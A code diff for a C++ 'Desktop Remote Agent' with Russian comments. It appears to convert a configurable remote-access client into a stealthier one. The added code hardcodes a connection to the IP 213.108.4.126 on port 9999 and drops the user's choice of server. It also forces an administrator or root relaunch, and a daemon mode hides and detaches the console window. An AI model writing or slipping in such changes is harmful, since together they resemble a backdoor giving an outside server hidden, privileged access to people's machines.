@@ -8,16 +8,23 @@
 #ifdef _WIN32
     #define WIN32_LEAN_AND_MEAN
     #include <windows.h>
+    #include <shellapi.h>
     #include <csignal>
 #else
     #include <csignal>
     #include <unistd.h>
+    #include <sys/stat.h>
+    #include <fcntl.h>
+    #include <cstdlib>
 #endif
+
+// ==================== Настройки по умолчанию ====================
+constexpr const char* DEFAULT_RELAY_HOST = "213.108.4.126";
+constexpr uint16_t DEFAULT_PORT = 9999;
 
 std::unique_ptr<RemoteAgent> g_agent;
 
 void signalHandler(int) {
-    std::cout << "\n[AGENT] Shutting down..." << std::endl;
     if (g_agent) {
         g_agent->stop();
     }
@@ -98,28 +105,149 @@ std::string loadOrGenerateId() {
     return new_id;
 }
 
+// Проверка прав администратора
+bool isRunningAsAdmin() {
+#ifdef _WIN32
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    
+    if (AllocateAndInitializeSid(&ntAuthority, 2,
+            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+            0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin != FALSE;
+#else
+    return geteuid() == 0;
+#endif
+}
+
+// Запрос прав администратора
+bool requestAdminPrivileges(int argc, char* argv[]) {
+#ifdef _WIN32
+    if (!isRunningAsAdmin()) {
+        // Получаем путь к текущему exe
+        char szPath[MAX_PATH];
+        GetModuleFileNameA(NULL, szPath, MAX_PATH);
+        
+        // Формируем аргументы
+        std::string args;
+        for (int i = 1; i < argc; ++i) {
+            if (!args.empty()) args += " ";
+            args += argv[i];
+        }
+        
+        // Запускаем от имени администратора
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.lpVerb = "runas";
+        sei.lpFile = szPath;
+        sei.lpParameters = args.c_str();
+        sei.hwnd = NULL;
+        sei.nShow = SW_NORMAL;
+        
+        if (ShellExecuteExA(&sei)) {
+            exit(0); // Закрываем текущий процесс
+        }
+        return false;
+    }
+    return true;
+#else
+    if (!isRunningAsAdmin()) {
+        std::cerr << "[AGENT] Требуются права root. Запустите с sudo." << std::endl;
+        
+        // Пытаемся перезапустить с sudo
+        std::string cmd = "sudo ";
+        for (int i = 0; i < argc; ++i) {
+            cmd += argv[i];
+            cmd += " ";
+        }
+        
+        std::cout << "[AGENT] Запрашиваем права root..." << std::endl;
+        int result = system(cmd.c_str());
+        if (result == 0) {
+            exit(0);
+        }
+        return false;
+    }
+    return true;
+#endif
+}
+
+// Запуск в режиме демона (фоновый процесс)
+bool daemonize() {
+#ifdef _WIN32
+    // Windows: скрываем консольное окно
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) {
+        ShowWindow(hWnd, SW_HIDE);
+    }
+    // Отсоединяемся от консоли
+    FreeConsole();
+    return true;
+#else
+    // Unix: классический double-fork для демонизации
+    pid_t pid = fork();
+    
+    if (pid < 0) {
+        return false;
+    }
+    
+    if (pid > 0) {
+        // Родительский процесс - выходим
+        std::cout << "[AGENT] Started in background (PID: " << pid << ")" << std::endl;
+        exit(0);
+    }
+    
+    // Дочерний процесс
+    if (setsid() < 0) {
+        return false;
+    }
+    
+    // Второй fork
+    pid = fork();
+    if (pid < 0) {
+        return false;
+    }
+    if (pid > 0) {
+        exit(0);
+    }
+    
+    umask(0);
+    chdir("/");
+    
+    // Перенаправляем потоки в /dev/null
+    int null_fd = open("/dev/null", O_RDWR);
+    if (null_fd >= 0) {
+        dup2(null_fd, STDIN_FILENO);
+        dup2(null_fd, STDOUT_FILENO);
+        dup2(null_fd, STDERR_FILENO);
+        if (null_fd > STDERR_FILENO) {
+            close(null_fd);
+        }
+    }
+    
+    return true;
+#endif
+}
+
 void printUsage(const char* program) {
-    std::cout << "Usage: " << program << " <relay_host> [options]\n"
+    std::cout << "Desktop Remote Agent\n"
+              << "====================\n\n"
+              << "Usage: " << program << " [options]\n\n"
+              << "По умолчанию подключается к серверу " << DEFAULT_RELAY_HOST << ":" << DEFAULT_PORT << "\n\n"
               << "Options:\n"
-              << "  -p, --port <port>    Relay server port (default: 9999)\n"
-              << "  -n, --name <name>    Agent name (default: hostname)\n"
-              << "  -i, --id <id>        Agent ID (auto-generated if not provided)\n"
-              << "  -h, --help           Show this help\n"
-              << "\nExample:\n"
-              << "  " << program << " my-vps.example.com -p 9999 -n \"Home PC\"\n"
+              << "  -d, --daemon         Запуск в фоновом режиме\n"
+              << "  -h, --help           Показать справку\n"
+              << "\nПримеры:\n"
+              << "  " << program << "           # Обычный запуск\n"
+              << "  " << program << " -d        # Запуск в фоне\n"
               << std::endl;
 }
 
 int main(int argc, char* argv[]) {
-    if (argc < 2) {
-        printUsage(argv[0]);
-        return 1;
-    }
-    
-    std::string relay_host;
-    uint16_t port = 9999;
-    std::string name = getHostname();
-    std::string id;
+    bool daemon_mode = false;
     
     // Парсим аргументы
     for (int i = 1; i < argc; ++i) {
@@ -128,33 +256,22 @@ int main(int argc, char* argv[]) {
         if (arg == "-h" || arg == "--help") {
             printUsage(argv[0]);
             return 0;
-        } else if (arg == "-p" || arg == "--port") {
-            if (i + 1 < argc) {
-                port = static_cast<uint16_t>(std::stoi(argv[++i]));
-            }
-        } else if (arg == "-n" || arg == "--name") {
-            if (i + 1 < argc) {
-                name = argv[++i];
-            }
-        } else if (arg == "-i" || arg == "--id") {
-            if (i + 1 < argc) {
-                id = argv[++i];
-            }
-        } else if (relay_host.empty() && arg[0] != '-') {
-            relay_host = arg;
+        } else if (arg == "-d" || arg == "--daemon") {
+            daemon_mode = true;
         }
     }
     
-    if (relay_host.empty()) {
-        std::cerr << "[AGENT] Error: Relay host is required" << std::endl;
-        printUsage(argv[0]);
+    // Запрашиваем права администратора
+    if (!requestAdminPrivileges(argc, argv)) {
+        std::cerr << "[AGENT] Не удалось получить права администратора" << std::endl;
         return 1;
     }
     
-    // Загружаем или генерируем ID
-    if (id.empty()) {
-        id = loadOrGenerateId();
-    }
+    // Используем захардкоженные настройки
+    std::string relay_host = DEFAULT_RELAY_HOST;
+    uint16_t port = DEFAULT_PORT;
+    std::string name = getHostname();
+    std::string id = loadOrGenerateId();
     
     signal(SIGINT, signalHandler);
     signal(SIGTERM, signalHandler);
@@ -162,10 +279,20 @@ int main(int argc, char* argv[]) {
     std::cout << "========================================\n"
               << "       Desktop Remote Agent             \n"
               << "========================================\n"
-              << "Relay:  " << relay_host << ":" << port << "\n"
+              << "Server: " << relay_host << ":" << port << "\n"
               << "Name:   " << name << "\n"
               << "ID:     " << id << "\n"
+              << "Mode:   " << (daemon_mode ? "Background" : "Foreground") << "\n"
+              << "Admin:  " << (isRunningAsAdmin() ? "Yes" : "No") << "\n"
               << "========================================\n" << std::endl;
+    
+    // Запуск в фоновом режиме
+    if (daemon_mode) {
+        if (!daemonize()) {
+            std::cerr << "[AGENT] Failed to daemonize" << std::endl;
+            return 1;
+        }
+    }
     
     g_agent = std::make_unique<RemoteAgent>(relay_host, port, id, name);
     g_agent->run();
